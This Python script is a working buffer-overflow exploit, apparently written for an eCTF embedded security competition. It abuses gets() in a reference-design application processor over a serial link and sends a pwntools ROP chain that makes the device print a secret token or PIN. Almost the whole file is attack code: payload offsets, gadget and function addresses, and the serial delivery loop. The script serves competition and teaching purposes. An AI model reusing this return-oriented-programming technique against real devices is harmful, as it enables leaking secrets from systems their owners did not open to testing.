# Adaptation of attestation_tool.py for pwning
# ROP Payload for Exploit for Reference Design
# Exploits the use of gets() in the recv_input() function

# AUTHOR: Nick Andry

# Crashes buffer, places address of token on the stack, then the address of puts\
# then pops the token address off the stack and then pops puts() into LR with that address as the argument\
# to print out the token

import argparse
import serial
import re
from loguru import logger
import sys
import pwn

# Logger formatting
fmt = (
    "<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | "
    "{extra[extra]: <6} | "
    "<level>{level: <8}</level> | "
    "<level>{message}</level> "
)

logger.remove(0)
logger.add(sys.stdout, format=fmt)


def create_payload():
    puts_addr = 0x10016334 - 1  # Needs a -1 because it is thumb
    printf_addr = 0x100134c8 - 1
    pin_addr = 0x10020658
    token_addr = 0x10020690
    # Used for Junk before ret addr
    prev_linking = 0x7473696c
    pwn.context.binary = pwn.ELF('build/ap.elf')
    info_beg = 0x100204f4
    info_end = 0x100204f0
    # beginning of validate_pin 0x1001085c
    # address with ret instruction 0x10010894
    pop_and_ret_gadget = 0x1001ffae - 1  # pop {r0, pc}
    offset_to_return_addr = 56
    offset_to_linking_addr = 52

    payload = pwn.flat([
        b'a' * offset_to_linking_addr,
        prev_linking,
        pop_and_ret_gadget,
        token_addr,
        puts_addr,
    ])

    return payload


# Pwn AP
def pwn_ap(args):
    ser = serial.Serial(
        port=args.application_processor,
        baudrate=115200,
        parity=serial.PARITY_NONE,
        stopbits=serial.STOPBITS_ONE,
        bytesize=serial.EIGHTBITS,
    )

    # Junk pin
    payload = create_payload()
    # Arguments passed to the AP
    input_list = [
        b"attest\r",
        payload + b"\r",
    ]

    # Send and receive messages until done
    message = input_list.pop(0)
    ser.write(message)
    logger.bind(extra="INPUT").debug(message)

    output = ""
    while True:
        byte = ser.read()
        char = byte.decode("utf-8", errors="ignore")
        output += char
        output = process_output(output, input_list, ser)


def process_output(output, input_list, ser):
    # Find INFO level messages
    match = re.search("%info: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").info(line.strip())
    # Find DEBUG level messages
    match = re.search("%debug: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").debug(line.strip())
    # Find ACK level messages
    match = re.search("%ack%", output)
    if match != None:
        used = True
        # Send next message
        output = output[:match.start()] + output[match.end():]
        message = input_list.pop(0)
        ser.write(message)
        logger.bind(extra="INPUT").debug(message)
    # Find SUCCESS level messages
    match = re.search("%success: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").success(line.strip())
        # exit(0)
    # Find ERROR level messages
    match = re.search("%error: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").error(line.strip())
        # exit(1)

    # ENSURE this regex is changed accordingly to the amount of into would like to leak
    # This will control what is nicely printed over UART
    match = re.search(r"[0-9A-Fa-f]{16}", output)
    if match != None and match.string != "aaaaaa":
        output = output[:match.start()] + output[match.end():]
        m = match.string.split('\n')
        for ind, i in enumerate(m):
            if i.strip() != "aaaaaa" and i.strip() != "":
                logger.bind(extra="OUTPUT").info("The PIN is: " + i)

    return output


# Main function
def main():
    # Parse arguments
    parser = argparse.ArgumentParser(
        prog="eCTF Overflow Exploitation Tool",
        description="Pwn an AP",
    )

    parser.add_argument(
        "-a",
        "--application-processor",
        required=True,
        help="Serial device of the AP"
    )

    args = parser.parse_args()
    pwn_ap(args)


if __name__ == "__main__":
    main()
